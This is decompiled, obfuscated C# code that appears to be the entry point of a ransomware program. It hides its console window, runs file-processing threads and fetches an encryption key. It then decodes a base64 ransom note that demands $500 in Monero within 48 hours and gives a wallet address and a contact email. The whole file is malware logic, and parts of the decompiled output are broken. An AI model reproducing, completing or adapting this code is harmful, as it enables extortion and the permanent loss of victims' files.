using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;

public class l
{
	public class m : k
	{
		public unsafe void a(string string_0)
		{
			((delegate*<int, void>)q.a[2])(0);
			((delegate*<string, void>)r.a[12])("Parsing files");
		}
	}

	[Serializable]
	public sealed class _003C_003Ec
	{
		public static readonly _003C_003Ec _003C_003E9 = new _003C_003Ec();

		public static Action<Thread> _003C_003E9__5_0;

		public static Action<Thread> _003C_003E9__5_1;

		internal void a(Thread thread_0)
		{
			/*calli with instance method signature not supportd*/;
		}

		internal void b(Thread thread_0)
		{
			int num = 309;
			if (thread_0 != null)
			{
				/*calli with instance method signature not supportd*/;
			}
		}
	}

	public sealed class n
	{
		public object a;
	}

	public sealed class o
	{
		public string a;

		public object b;

		public void a()
		{
			_003CModule_003E.a(((n)b).a, (object)this.a);
		}
	}

	public const int a = 0;

	public const int b = 5;

	public static object c;

	public static object d;

	public unsafe static void a(string[] args)
	{
		int num = 85;
		((delegate*<int, void>)q.a[2])(0);
		IntPtr consoleWindow = _003CModule_003E.GetConsoleWindow();
		_003CModule_003E.h = 2081625616;
		_003CModule_003E.ShowWindow(consoleWindow, 0);
		_003CModule_003E.l = -1437277352;
		object obj = new g();
		object k_ = new e((i)obj);
		object j_ = new d();
		object obj2 = default(object);
		object obj3 = obj2;
		_003CModule_003E.l = -759738571;
		global::c.a = obj3;
		List<string> list_ = ((h)new c()).a();
		_003CModule_003E.h = 1308380089;
		List<Thread> list = _003CModule_003E.a(list_, new b((j)j_, (k)k_));
		d = obj;
		Action<Thread> action = _003C_003Ec._003C_003E9__5_0;
		_003CModule_003E.g = obj;
		if (action == null)
		{
			action = (_003C_003Ec._003C_003E9__5_0 = _003C_003Ec._003C_003E9.a);
		}
		list.ForEach(action);
		_003CModule_003E.p = -1091718226;
		((i)obj).GetEncryptionKey();
		global::b.c = -1978466511;
		obj2 = ((delegate*<string, byte[]>)r.a[num - 67])("PGh0bWwgbGFuZz0iZW4iPgo8aGVhZD48L3N0eWxlPgogICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgPHRpdGxlPkVuY3J5cHRlZG5jcnlwdGVkPC90aXRsZT4KPC9oZWFkPgoKPGJvZHk+CiAgPHN0eWxlPgogICBib2R5IHsKICAgIGJhY2tncm91bmQ6ICMwMDAwMDA7CiAgICBjb2xvcjogI0ZGMDAwMDsKCWZvbnQtc2l6ZTogMTdweDsKCXRleHQtYWxpZ246IGNlbnRlcgogICB9CiAgPC9zdHlsZT4KPGgzPk9vcHMsIHlvdXIgZmlsZXMgYXJlIGVuY3J5cHRlZCEhITwvaDM+CjxoMz5XaGF0IGhhcHBlbmVkIHRvIG15IGNvbXB1dGVyPzwvaDM+CjxwPllvdXIgaW1wb3J0YW50IGZpbGVzIGFyZSBlbmNyeXB0ZWQuPGJyIC8+TWFueSBvZiB5b3VyIGRvY3VtZW50cywgcGhvdG9zLCB2aWRlb3MgYW5kIG90aGVyIGZpbGVzIG5vIGxvbmdlciB3b3JrIGJlY2F1c2UgdGhleSBhcmUgZW5jcnlwdGVkLCBtYXliZSB5b3UgYXJlIGJ1c3kgbG9va2luZyBmb3IgYSB3YXkgdG8gcmVjb3ZlciB5b3VyIGZpbGVzLCBidXQgZG8gbm90IHdhc3RlIHlvdXIgdGltZSwgbm8gb25lIGNhbiByZWNvdmVyIHlvdXIgZmlsZXMgd2l0aG91dCBvdXIgZGVjcnlwdGlvbiBzZXJ2aWNlLjwvcD4KPGgzPldpbGwgSSBiZSBhYmxlIHRvIHJlY292ZXIgbXkgZmlsZXM/PC9oMz4KPHA+V2UgZ3VhcmFudGVlIHRoYXQgeW91IGNhbiByZWNvdmVyIGFsbCB5b3VyIGZpbGVzIHNhZmVseSBhbmQgZWFzaWx5IGFmdGVyIG91ciBjb25kaXRpb25zIGFyZSBtZXQuPC9wPgo8aDM+VG8gZGVjcnlwdCBmaWxlcywgeW91IG5lZWQgdG8gcGF5LjwvaDM+IAo8cD5XZSBnaXZlIHlvdSAyIGRheXMgdG8gcGF5LCBpZiB5b3UgZG9uJ3QgbWFrZSBpdCwgdGhlIGtleSB0byBkZWNyeXB0IHlvdXIgZmlsZXMgd2lsbCBhdXRvbWF0aWNhbGx5IGJlIGRlbGV0ZWQgZnJvbSBvdXIgc2VydmVyIGFuZCB5b3UgbG9zdCB5b3VyIGZpbGVzIGZvcmV2ZXIhPC9wPgo8cD4wLTQ4IGhvdXJzID0gJCA1MDA8L3A+CjxoMz5Ib3cgZG8gaSBwYXk/PC9oMz4KPHA+V2UgYWNjZXB0IHBheW1lbnQgaW4gY3J5cHRvY3VycmVuY3kgTW9uZXJvIChYTVIpLiBXaGF0IGlzIE1vbmVybyAoWE1SKSB5b3UgY2FuIGZpbmQgaGVyZTogPGEgdGl0bGU9ImZhcSIgaHJlZj0iaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTW9uZXJvXyhjcnlwdG9jdXJyZW5jeSkiIHRhcmdldD0iX2JsYW5rIiByZWw9Im5vb3BlbmVyIj5MaW5rIHRvIFdpa2lwZWRpYTwvYT48L3A+CjxwPkhvdyB0byBidXkgTW9uZXJvIChYTVIpIHdpdGggVVNEIENyZWRpdC9EZWJpdCBDYXJkPyBZb3UgY2FuIGZpbmQgaGVyZTogPGEgdGl0bGU9ImZhcSIgaHJlZj0iaHR0cHM6Ly9yaXBwbGVjb2lubmV3cy5jb20vYnV5LW1vbmVyby14bXItd2l0aC11c2QtY3JlZGl0LWNhcmQiIHRhcmdldD0iX2JsYW5rIiByZWw9Im5vb3BlbmVyIj5MaW5rIGhvdyB0byBidXk8L2E+PC9wPgo8cD5Zb3UgY2FuIGJ1eSBNb25lcm8gKFhNUikgd2l0aCBVU0QgQ3JlZGl0L0RlYml0IENhcmQgaGVyZTogPGEgdGl0bGU9ImZhcSIgaHJlZj0iaHR0cHM6Ly9jaGFuZ2VsbHkuY29tL2V4Y2hhbmdlL3VzZC94bXIiIHRhcmdldD0iX2JsYW5rIiByZWw9Im5vb3BlbmVyIj5QYXltZW50IGxpbms8L2E+PC9wPgo8aDM+VXNlIHRoaXMgTW9uZXJvIChYTVIpIHdhbGxldCBhZGRyZXNzIGZvciBwYXltZW50OjwvaDM+CjxwPjQ0NkR6dDN2cFRzRzZYb0oxUm5velk0djJqclNkcVlBVWpVVzdVN01WbVJIVGhRRHhtZlNkcVhadUdSQWFSU214OVJaQzhwRDhGeUdmWDRzRFpxZnNDb3hFS2JrWHA4PC9wPgo8aDM+WW91ciBwZXJzb25hbCBjb2RlLCBlbnRlciBpdCBpbiB0aGUgc3ViamVjdCBsaW5lIG9mIHRoZSBtYWlsIHdoZW4gc2VuZGluZyBtYWlsOjwvaDM+CjxwPjE0NTU3PC9wPgo8aDM+Q29udGFjdCBlbWFpbCBmb3IgYW55IHF1ZXN0aW9uOjwvaDM+CjxwPnlvZ3luaWNvZkBwcm90b25tYWlsLmNvbTwvcD4KPGgzPkFmdGVyIHBheW1lbnQsIHdyaXRlIHRvIG91ciBlbWFpbCwgaW5kaWNhdGUgeW91ciBwZXJzb25hbCBjb2RlIGluIHRoZSBzdWJqZWN0IGxpbmUgYW5kIHdlIHdpbGwgc2VuZCB5b3UgYSBkZWNvZGVyIGluIGEgcmVzcG9uc2UgbGV0dGVyLjwvaDM+CjwvYm9keT4KCjwvaHRtbD4=");
		string @string = ((delegate*<Encoding>)r.a[num - 66])().GetString((byte[])obj2);
		_003CModule_003E.c = k_;
		_003CModule_003E.p = -1652138191;
		f object_ = new f(@string, "Read-me!", 20);
		_003CModule_003E.p = 1809257038;
		_003CModule_003E.k = 1549806971;
		_003CModule_003E.a((object)object_);
		Action<Thread> action2 = _003C_003Ec._003C_003E9.b;
		_003CModule_003E.l = 796469985;
		list.ForEach(action2);
	}
}
